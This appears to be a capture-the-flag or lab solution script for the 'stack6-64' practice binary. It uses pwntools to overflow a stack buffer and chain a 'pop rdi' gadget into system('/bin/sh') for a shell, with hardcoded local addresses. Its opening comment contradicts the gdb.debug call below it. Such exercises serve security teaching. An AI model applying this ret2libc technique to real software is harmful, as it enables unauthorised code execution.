#!/usr/bin/python
#solved locally without attaching gdb
from pwn import *

context.binary = "./stack6-64"
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p = gdb.debug('./stack6-64', gdbscript='''
                                            b *main
                                            b *getpath+57
                                            b *getpath+94
                                            continue
                                        ''')

offset = 104
ret_addr = 0x4004ce
rop_addr = 0x4006f3 #pop rdi; ret;
system_addr = 0x7ffff7dddd60
exit_addr =  0x7ffff7dd25f0
shell_addr = 0x7ffff7f65698

payload = flat({offset:rop_addr},shell_addr, ret_addr, system_addr, exit_addr)

p.sendline(payload) 
p.interactive()